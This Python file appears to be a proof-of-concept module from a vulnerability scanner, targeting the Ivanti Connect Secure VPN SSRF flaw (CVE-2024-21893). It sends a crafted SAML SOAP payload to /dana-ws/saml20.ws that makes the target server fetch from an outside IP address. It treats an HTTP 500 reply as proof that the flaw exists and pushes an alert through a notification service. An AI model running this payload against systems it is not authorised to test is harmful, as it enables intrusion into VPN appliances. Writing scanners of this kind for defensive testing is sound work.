vulnerability_scanner/poc/Ivanti_Secure_VPN_SSRF_scan.py

from Common.Common_Request import common_request
from Modules.Configure import ServerJ


class Basic_information:
    no = 153,
    bugName = 'Ivanti Connect Secure VPN SSRF漏洞(CVE-2024-21893)'


def scan_Ivanti_Secure_VPN_SSRF(url, proxies, append_to_output, serverJ_key, bugName):
    path = "/dana-ws/saml20.ws"
    headers = {
        'Content-Type': 'text/xml',
        'Connection': 'close'
    }
    data = '''
        <?xml version="1.0" encoding="UTF-8"?>
        <soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
          <soap:Body>
            <ds:Signature xmlns:ds="http://www.w3.org/2000/09/xmldsig#">
              <ds:SignedInfo>
                <ds:CanonicalizationMethod Algorithm="http://www.w3.org/2001/10/xml-exc-c14n#"/>
                <ds:SignatureMethod Algorithm="http://www.w3.org/2000/09/xmldsig#rsa-sha1"/>
              </ds:SignedInfo>
              <ds:SignatureValue>dummy</ds:SignatureValue>
              <ds:KeyInfo xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://www.w3.org/2000/09/xmldsig#">
                <ds:RetrievalMethod URI="http://38.12.31.36:8080"/>
                <ds:X509Data/>
              </ds:KeyInfo>
              <ds:Object></ds:Object>
            </ds:Signature>
          </soap:Body>
        </soap:Envelope>
        '''

    response = common_request(url, path, headers, data=data,method='POST', timeout=5, proxies=proxies,
                              append_to_output=append_to_output)
    if response is not None:
        if response.status_code == 500 :
            append_to_output(f"[+] {url} 存在{bugName}！！！！", "red")
            ServerJ.sc_send(bugName, f"漏洞连接: {url}\r ", ServerJ_Key=serverJ_key)
        else:
            append_to_output(f"[-] {url} 不存在{bugName}", "green")
